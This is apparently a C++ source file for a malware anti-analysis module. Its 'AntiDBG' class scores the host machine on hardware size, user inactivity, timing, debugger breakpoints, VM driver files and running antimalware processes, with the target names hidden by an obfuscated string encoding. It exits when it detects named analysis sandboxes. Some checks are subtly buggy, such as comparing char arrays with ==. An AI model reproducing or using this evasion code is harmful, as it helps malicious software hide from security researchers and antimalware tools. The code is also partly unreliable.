#include "common.h"


void AntiDBG::Initialize() {
    memset(&TrustItem,false,sizeof(TrustItem));
    trust = 100;

    if (ResCheck()) {
        if(!MonitorCheck() && !PowerCheck())
            trust -= 20;
    }    
    if (VMGFileCheck()) {
        trust -= 30;
    }
    if (VMHFileCheck()) {
        trust += 30;
    }
    if (HDDCheck()) {                   //fix
        trust -= 30;
    }
    if (RAMCheck()) {                      //fix
        trust -= 30;
    }
    if (CPUCheck()) {
        trust -= 30;
    }
    if (TimeCheck()) {
        trust -= 30;
    }
    if (HybridCucker()) {
        exit(0);
    }
    if (InteractionCheck()) {
        trust -= 20;
    }
    if(InternetCheck()){
        trust += 10;
    }
    if(AMCheck())
        trust += 10;
    if(AppCheck())
        trust += 10;
    if (IsDebuggerPresent() || BreakpointChecker() || BreakpointChecker2()) {
        trust -= 50;
        TrustItem.IsBeingDebugged = true;
    }
    if (HaboCucker()) {
        FinalExit();
    }
}

bool AntiDBG::ResCheck() {

    int x1, y1, x2, y2;

    x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
    y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
    x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    y2 = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    double w = x2 - x1;
    double h = y2 - y1;


    double Ratios[6] = { 4.0 / 3.0,16.0 / 9.0,21.0 / 9.0,32.0 / 9.0,16.0 / 10.0,5.0 / 4.0 };
    double Ratioed = w / h;
    for (int q = 0; q < 6; q++) {
        if (Ratioed == Ratios[q]) {
            return false;
        }
    }
    TrustItem.IsResCheck = true;
    return true;
}
bool AntiDBG::VMGFileCheck() {
    LPCSTR BannedFiles[] = {
		"ye7PpN2Xodv\\JZ|LZ\\4noemznO|2Y\\2PZgVz3e5;I\\wn4Xer|S",
		"|n5ewW4e3;Ydv\\JZ|LZ\\4noemznO|2Y\\2PZgVz3e5;I\\wn4Xer|S",
		"ye7PpNkPZfv\\JZ|LZ\\4noemznO|2Y\\2PZgVz3e5;I\\wn4Xer|S",
		"OZg|7EevT4Ov\\JZ|LZ\\4noemznO|2Y\\2PZgVz3e5;I\\wn4Xer|S",
		"|n5ewm4[v\\JZ|LZ\\4noemznO|2Y\\2PZgVz3e5;I\\wn4Xer|S",
		"OZg|7{eofIcv\\JZ|LZ\\4noemznO|2Y\\2PZgVz3e5;I\\wn4Xer|S",
		"ye7PpNuT5[vXYdv\\JZ|LZ\\4noemznO|2Y\\2PZgVz3e5;I\\wn4Xer|S",
		"ye7PpN4iFgv\\JZ|LZ\\4noemznO|2Y\\2PZgVz3e5;I\\wn4Xer|S",
		"ye7PpNtPJ\\5Hoev\\JZ|LZ\\4noemznO|2Y\\2PZgVz3e5;I\\wn4Xer|S",
		"|n5ewW4e3;YdkPZfv\\JZ|LZ\\4noemznO|2Y\\2PZgVz3e5;I\\wn4Xer|S",
		"ye7PpNkT4cv\\JZ|LZ\\4noemznO|2Y\\2PZgVz3e5;I\\wn4Xer|S",
		"ye7PpNonoenPZf2Xodv\\JZ|LZ\\4noemznO|2Y\\2PZgVz3e5;I\\wn4Xer|S",
		"OZg|7kenTJejTY[2Xodv\\JZ|LZ\\4noemznO|2Y\\2PZgVz3e5;I\\wn4Xer|S",
		"OZg|7U\\|X5dPj5dE\\HZ|LZ\\4noemznO|2Y\\2PZgVz3e5;I\\wn4Xer|S",
		"OZg|7Ef|XYfJj5dE\\HZ|LZ\\4noemznO|2Y\\2PZgVz3e5;I\\wn4Xer|S",
		"OZg|7kTVj5dE\\HZ|LZ\\4noemznO|2Y\\2PZgVz3e5;I\\wn4Xer|S",
		"OZg|7{dnTYcYj5dE\\HZ|LZ\\4noemznO|2Y\\2PZgVz3e5;I\\wn4Xer|S",
		"yIdm7Ee|nI\\6;o[4znO|2Y\\2PZgVz3e5;I\\wn4Xer|S",
		"yIdm7{cx;Ic6;o[4znO|2Y\\2PZgVz3e5;I\\wn4Xer|S",
		"uzI\\wCpd6LZd6;o[4znO|2Y\\2PZgVz3e5;I\\wn4Xer|S",
		"CduToNuf4d6;o[4znO|2Y\\2PZgVz3e5;I\\wn4Xer|S",
		"uzI\\wWJe|nZ[{LZ[uf4d6;o[4znO|2Y\\2PZgVz3e5;I\\wn4Xer|S",
		"CduToNunIf3L5[uf4d6;o[4znO|2Y\\2PZgVz3e5;I\\wn4Xer|S",
		"uzI\\wWJe|L5d{LZ\\uf4d6;o[4znO|2Y\\2PZgVz3e5;I\\wn4Xer|S",
		"uzI\\wWJe|v4[jLI\\nXo\\uf4d6;o[4znO|2Y\\2PZgVz3e5;I\\wn4Xer|S",
		"yIdm7UfyP5clHIeuf4d6;o[4znO|2Y\\2PZgVz3e5;I\\wn4Xer|S",
		"uzI\\wWJe|j4\\3;oeqT5e|HIeuf4d6;o[4znO|2Y\\2PZgVz3e5;I\\wn4Xer|S",
		"WIgn7U\\lnof{X4e6;o[4znO|2Y\\2PZgVz3e5;I\\wn4Xer|S",
		"WIgn7UgjLJf6;o[4znO|2Y\\2PZgVz3e5;I\\wn4Xer|S",
		"WIgn7EdxLJfw;4S6;oSYznO|2Y\\2PZgVz3e5;I\\wn4Xer|S",
		"|n5ew64dxzIdjLIZ|LZ\\4noemznO|2Y\\2PZgVz3e5;I\\wn4Xer|S",
		"OZg|7Ud4vIfn7IZ|LZ\\4noemznO|2Y\\2PZgVz3e5;I\\wn4Xer|S",
		"|n5ewOYcwHIe4DJZ|LZ\\4noemznO|2Y\\2PZgVz3e5;I\\wn4Xer|S",
		"ye7PpN|\\4dr\\JZ|LZ\\4noemznO|2Y\\2PZgVz3e5;I\\wn4Xer|S",
		"ye7PpNxTYfyf4dr\\JZ|LZ\\4noemznO|2Y\\2PZgVz3e5;I\\wn4Xer|S",
		"ye7PpN2XJewn4dr\\JZ|LZ\\4noemznO|2Y\\2PZgVz3e5;I\\wn4Xer|S",
		"OZg|7{\\wL5dr\\JZ|LZ\\4noemznO|2Y\\2PZgVz3e5;I\\wn4Xer|S",
		"|n5ewm4elP5dr\\JZ|LZ\\4noemznO|2Y\\2PZgVz3e5;I\\wn4Xer|S",
		"OZg|7kenP5dr\\JZ|LZ\\4noemznO|2Y\\2PZgVz3e5;I\\wn4Xer|S",
		"|n5ewK5d2P5dr\\JZ|LZ\\4noemznO|2Y\\2PZgVz3e5;I\\wn4Xer|S",
		"y3o[wKZ[k;4dozX[er|S",
		"Cf6TpN|Toexf5e|HIeer|S",
		"2jJfwyYcj3Y\\er|S",
		"vTJcwyYcj3Y\\er|S",
		"O4dm7{c{;4fer|S",
		"6P4dm7{c{;4fer|S",
		"OJd67{c{;4fer|S"
    };

    for (int i = 0; i < sizeof(BannedFiles)/ sizeof(BannedFiles[0]); i++) {
        if (fexists(HardDecode(BannedFiles[i]))) {
            goto EscapeLabel;
        }
    }

    LPVOID drivers[1024];
    DWORD cbNeeded;
    int cDrivers, i;
    if (K32EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
    {
        char szDriver[1024];
        cDrivers = cbNeeded / sizeof(drivers[0]);
        for (i = 0; i < cDrivers; i++)
        {
            if (K32GetDeviceDriverBaseNameA(drivers[i], szDriver, sizeof(szDriver) / sizeof(szDriver[0])))
            {
                if (szDriver == HardDecode("ye7PpNnPZfx3GgxLmX") || szDriver == HardDecode("ye7PpNxXI\r\HgxLmX") || szDriver == HardDecode("ye7PpN2PZ\3fGgxLmX"))
                    goto EscapeLabel;
            }
        }
    }

    return false;

EscapeLabel:
    TrustItem.IsInVM = true;
    return true;
}
bool AntiDBG::VMHFileCheck() {
    LPCSTR BannedFiles[] = { 
		"|n5ew[peGj5dE\\HZ|LZ\\4noemznO|2Y\\2PZgVz3e5;I\\wn4Xer|S",
		"4CJ\\DTZ\\Qj5dE\\HZ|LZ\\4noemznO|2Y\\2PZgVz3e5;I\\wn4Xer|S",
		"|n5ew[4fOTZ\\Qj5dE\\HZ|LZ\\4noemznO|2Y\\2PZgVz3e5;I\\wn4Xer|S",
		"|n5ew64dPL2WXj5dE\\HZ|LZ\\4noemznO|2Y\\2PZgVz3e5;I\\wn4Xer|S"
    };

    for (int i = 0; i < sizeof(BannedFiles) / sizeof(BannedFiles[0]); i++) {
        if (fexists(HardDecode(BannedFiles[i]))) {
            TrustItem.IsHostingAVM = true;
            return true;
        }
    }

    return false;

}
bool AntiDBG::HDDCheck() {
    ULARGE_INTEGER total_bytes;
    HANDLE drive;
    BOOL result;
    GET_LENGTH_INFORMATION size;
    DWORD lpBytesReturned;
    drive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (drive == INVALID_HANDLE_VALUE) {
        CloseHandle(drive);
        return false;
    }else{
        result = DeviceIoControl(drive, IOCTL_DISK_GET_LENGTH_INFO, NULL, 0, &size, sizeof(GET_LENGTH_INFORMATION), &lpBytesReturned, NULL);
        CloseHandle(drive);
        if (result != 0) {
            if (size.Length.QuadPart / 1073741824 <= MinHardDisk) {
                TrustItem.IsSmallHardDrive = true;
                return true;
            }
        }
    }
    if (GetDiskFreeSpaceExA("C:\\", NULL, &total_bytes, NULL))
    {
        if (total_bytes.QuadPart / 1073741824 <= MinHardDisk) {
            TrustItem.IsSmallHardDrive = true;
            return true;
            //add additional flag, since someone is trying to bamboozle me by hooking DeviceIoControl
        }
    }
    return false;
}
bool AntiDBG::RAMCheck() {
    MEMORYSTATUSEX RAMStatus;
    RAMStatus.dwLength = sizeof(RAMStatus);
    GlobalMemoryStatusEx(&RAMStatus);
    DWORD Ram = ((RAMStatus.ullTotalPhys / 1024) / 1024);
    if ((DWORD)2048 > Ram) {
        TrustItem.IsSmallRAM = true;
        return true;
    }
    return false;
}
bool AntiDBG::CPUCheck() {
    SYSTEM_INFO siSysInfo;
    GetSystemInfo(&siSysInfo);
    if (siSysInfo.dwNumberOfProcessors < RequiredCores) {
        TrustItem.HasOneCore = true;
        return true;
    }
    return false;
}
bool AntiDBG::MonitorCheck() {
    if (GetSystemMetrics(SM_CMONITORS) >= 2) {
        TrustItem.HasMultipleMonitors = true;
        return true;
    }
    return false;
}
bool AntiDBG::TimeCheck() {
    DWORD Tick = GetTickCount();
    Sleep(5000);
    DWORD Tick2 = GetTickCount();
    if ((int)(Tick2 - Tick) < 5000 - (5000 / 10)) {
        TrustItem.HasBeenTimepatched = true;
        return true;
    }
}
bool AntiDBG::InteractionCheck() {

    POINT position1, position2;
    LASTINPUTINFO InputInfo;
    DWORD Tick;
    GetCursorPos(&position1);
    Sleep(10000);
    GetCursorPos(&position2);
    if ((position1.x == position2.x) && (position1.y == position2.y)) {
        TrustItem.UserIsInactive = true;
        Sleep(5000);
        Tick = GetTickCount();
        GetLastInputInfo(&InputInfo);
        if (Tick - InputInfo.dwTime > MaxInactivity*1000) {
            TrustItem.ExtUserActivity = true;
            return true;
        }
        return false;
    }
    return false;
}
bool AntiDBG::InternetCheck() {
    DWORD DWFlags;
    if (InternetGetConnectedState(&DWFlags, NULL)) {
        if (InternetCheckConnectionA("https://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0)) {
            TrustItem.HasActiveInternet = true;
            return true;
        }else {
            TrustItem.Proxied = true;
            return false;
        }
    }
    return false;
}
bool AntiDBG::AMCheck() {
    int res = FALSE;
    HANDLE hpSnap;
    PROCESSENTRY32 pentry;
    LPCSTR BannedProcs[] = {
		"njZ\\wmZ[{TZdjLYd",
		"WIgn7UdjLYd",
		"WIgn7EfwX4\\jTo[",
		"S\\6XoNn7YcuTY\\{To[",
		"WIgn7{e|To[",
		"njZ\\wOofVT5ej\\ZS",
		"WIgn7UUXT5ej\\Z[",
		"WIgn7kf{X4W5\\Y[",
		"njZ\\w[5WkX4XqPZ[",
		"njZ\\wS5eqPof|P4[",
		"njZ\\wOof|DZ[4Hod",
		"njZ\\wOof|HYd",
		"njZ\\wOof|7YdlHYd",
		"njZ\\wOof|TZ[y34dlHYd",
		"WIgn7U\\{no\\n\\Yd",
		"S\\6XoN|3Ydn\\Yd",
		"WIgn7{eyTpfn\\Yd",
		"S\\6XoN7Hoe2PYd",
		"S\\6XoNyTZ[n\\Yd",
		"njZ\\wSIdnnIc|PYV"
    };
    hpSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hpSnap != INVALID_HANDLE_VALUE) {
        pentry.dwSize = sizeof(PROCESSENTRY32);
    }
    else {
        return false;
    }

    if (!Process32First(hpSnap, &pentry)) {
        CloseHandle(hpSnap);
        return false;
    }

    do {
        for (int i = 0; i < 20; i++) {                                              //deploy dynamic size thanks
            if (lstrcmpi(pentry.szExeFile, BannedProcs[i]) == 0) {
                TrustItem.HasRunningAntiMalware = true;
                return true;
            }
        }
    } while (Process32Next(hpSnap, &pentry)); 
    return false;
}
bool AntiDBG::AppCheck() {
    HANDLE hFind;
    WIN32_FIND_DATAA data;

    char Directory[MAX_PATH] = "C:\\Program Files\\*.*";

    int FileCounter = 0;

    char FilePath[MAX_PATH + 1];
    DWORD FileSize = MAX_PATH + 1;

    hFind = FindFirstFileA(Directory, &data);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            //GetFinalPathNameByHandleA(hFind, FilePath, FileSize, 0x0);
            //if (!(GetFileAttributesA(FilePath) & FILE_ATTRIBUTE_DIRECTORY)) {
            FileCounter++;
            //}
        } while (FindNextFileA(hFind, &data));
        FindClose(hFind);
    }
    if (FileCounter >= MinRequiredApps) {
        TrustItem.HasMoreThan20Apps = true;
        return true;
    }
    return false;
}
bool AntiDBG::HaboCucker() {
    char FileName[MAX_PATH];
    GetModuleFileNameA(NULL, FileName, MAX_PATH);
    std::string RetString;
    for (int i = 0; i < strlen(FileName); i++) {
        RetString += FileName[i];
        if (FileName[i] == '\\')
            RetString = "";
    }
    if (strcmp("996e.exe", RetString.c_str()) == 0) {
        TrustItem.IsInHabo = true;
        return true;
    }
    return false;
}
BOOL AntiDBG::BreakpointChecker() {
    __try
    {
        __debugbreak();
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        return false;
    }
    return true;
}
BOOL AntiDBG::BreakpointChecker2() {
    __try
    {
        RaiseException(DBG_PRINTEXCEPTION_C, 0, 0, 0);
    }
    __except (GetExceptionCode() == DBG_PRINTEXCEPTION_C)
    {
        return false;
    }

    return true;
}
bool AntiDBG::HybridCucker() {/*
    char PathToFile[MAX_PATH];
    HMODULE GetModH = GetModuleHandle(NULL);
    GetModuleFileNameA(GetModH, PathToFile, sizeof(PathToFile));
    std::string::size_type pos = std::string(PathToFile).find_last_of("\\/");
    std::string CurrentDir = std::string(PathToFile).substr(0, pos);
    char* AppData = nullptr;
    size_t AppDataSize;
    _dupenv_s(&AppData, &AppDataSize, "HOMEPATH");
    std::string AdobePath = AppData;
    AdobePath += "\\Desktop\\Acrobat Reader DC.lnk";
    if (IsWindows7OrGreater && !IsWindows8OrGreater) {
        if (CurrentDir == "C:\\") {
            //if (fexists(AdobePath))
            return true;
        }
    }*/
    HANDLE hpSnap;
    PROCESSENTRY32 pentry;
    hpSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hpSnap != INVALID_HANDLE_VALUE) {
        pentry.dwSize = sizeof(PROCESSENTRY32);
    }
    else {
        return false;
    }
    if (!Process32First(hpSnap, &pentry)) {
        CloseHandle(hpSnap);
        return false;
    }
    do {
        if(pentry.szExeFile== "AutoIt3.exe")
            if (VMGFileCheck())
                return true;
    } while (Process32Next(hpSnap, &pentry));
    return false;
}
bool AntiDBG::PowerCheck() {
    SYSTEM_POWER_STATUS SysPowerStatus;
    if (GetSystemPowerStatus(&SysPowerStatus) != 0) {
        if (SysPowerStatus.BatteryFlag != 128 && SysPowerStatus.BatteryFlag != 255)
            return true;
    }
    return false;
}
